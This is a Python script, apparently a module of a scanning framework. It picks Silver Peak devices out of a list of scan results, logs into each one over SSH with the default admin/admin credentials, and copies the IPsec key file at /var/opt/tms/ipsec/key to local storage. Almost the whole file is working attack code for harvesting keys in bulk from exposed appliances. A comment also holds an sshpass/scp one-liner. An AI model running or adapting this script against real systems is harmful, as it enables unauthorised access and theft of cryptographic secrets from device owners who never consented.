#!/usr/bin/env python3
from paramiko import SSHClient, AutoAddPolicy
from socket import timeout
from paramiko.ssh_exception import (
    AuthenticationException,
    NoValidConnectionsError,
    SSHException,
)
from scp import SCPClient
from json import load
from os import listdir
from pathlib import Path


class ScpGrabberDefaultValues:
    JSON_HOSTS = "hosts.json"
    RESULTS_DIRECTORY = Path("results/scp_grabber")
    SCP_REMOTE_PATH = "/var/opt/tms/ipsec/key"
    SCP_FILENAME_POSTFIX = "file"
    FILTER_WORD = "silver peak"
    FILTER_FIELD = "vendor"

    SSH_USER = "admin"
    SSH_PASSWORD = "admin"
    SSH_PORT = 22
    SSH_AUTH_TIMEOUT_SEC = 30
    SSH_TIMEOUT_SEC = 60


def load_hosts(filename: str = ScpGrabberDefaultValues.JSON_HOSTS) -> list or dict:
    """
    Load hosts from some file (if we want to use this script separately from
    Grinder Framework
    :param filename: filename of file with hosts (e.g. "hosts.json")
    :return: loaded and parsed json
    """
    with open(filename, mode="r") as json_hosts:
        return load(json_hosts)


def check_if_exist(
    host: str, results_dir: str = str(ScpGrabberDefaultValues.RESULTS_DIRECTORY)
) -> bool:
    """
    Check if we already got that file from host
    :param host: host to check
    :param results_dir: directory where to check
    :return: bool
    """
    if f"{host}_{ScpGrabberDefaultValues.SCP_FILENAME_POSTFIX}" in listdir(results_dir):
        return True
    return False


def filter_hosts(
    hosts: list,
    filter_word: str = ScpGrabberDefaultValues.FILTER_WORD,
    filter_field: str = ScpGrabberDefaultValues.FILTER_FIELD,
) -> list or dict:
    """
    Use this function if you want to get only
    some special vendors from your results list
    (when you use it without Grinder Framework)
    :param hosts: hosts to filter
    :param filter_word: word to filter hosts with
    :param filter_field: field of hosts results to filter
    :return: filtered hosts
    """
    _filter_hosts = {}
    for host in hosts:
        if filter_word not in host.get(filter_field, "").lower():
            continue
        _filter_hosts.update(
            {
                host.get("ip"): {
                    "vendor": host.get("vendor"),
                    "product": host.get("product"),
                }
            }
        )
    return _filter_hosts


def grab(
    hostname: str,
    username: str = ScpGrabberDefaultValues.SSH_USER,
    password: str = ScpGrabberDefaultValues.SSH_PASSWORD,
    port: int = ScpGrabberDefaultValues.SSH_PORT,
) -> str or None:
    """
    Grab some file from SSH with SCP
    :param hostname: host to connect
    :param username: username to connect with
    :param password: password to connect with
    :param port: port to connect
    :return: str status
    """
    if check_if_exist(hostname):
        return
    ssh = SSHClient()
    ssh.set_missing_host_key_policy(AutoAddPolicy())
    ssh.load_system_host_keys()
    is_connect_successful = "connect not successful"
    try:
        ssh.connect(
            hostname=hostname,
            username=username,
            password=password,
            port=port,
            auth_timeout=ScpGrabberDefaultValues.SSH_AUTH_TIMEOUT_SEC,
            timeout=ScpGrabberDefaultValues.SSH_TIMEOUT_SEC,
        )
        is_connect_successful = "connect is successful"
        with SCPClient(ssh.get_transport()) as scp:
            scp.get(
                remote_path=ScpGrabberDefaultValues.SCP_REMOTE_PATH,
                local_path=f"{str(ScpGrabberDefaultValues.RESULTS_DIRECTORY)}/{hostname}_{ScpGrabberDefaultValues.SCP_FILENAME_POSTFIX}",
            )
        return is_connect_successful
    except (AuthenticationException, NoValidConnectionsError, SSHException, timeout):
        ssh.close()
        return is_connect_successful
    except:
        ssh.close()
        return is_connect_successful


def main(host_info: dict) -> dict:
    """
    Main module runner
    :param host_info: information about host
    :return: dict with status
    """
    ScpGrabberDefaultValues.RESULTS_DIRECTORY.mkdir(exist_ok=True, parents=True)
    print(
        f"Grab file from {host_info.get('vendor')}, {host_info.get('product')} ({host_info.get('ip')})"
    )
    result = grab(host_info.get("ip"))
    return {"status": result}


if __name__ == "__main__":
    # sshpass -p "password" scp username@0.0.0.0:/remote/path/here ./local/path/here

    ScpGrabberDefaultValues.RESULTS_DIRECTORY.mkdir(exist_ok=True, parents=True)
    hosts = load_hosts()
    filter_hosts_res = filter_hosts(hosts)
    length = len(filter_hosts_res)
    for index, (host_ip, host_info) in enumerate(filter_hosts_res.items()):
        print(index, length)
        grab(host_ip)
    grab("TEST_IP_HERE")
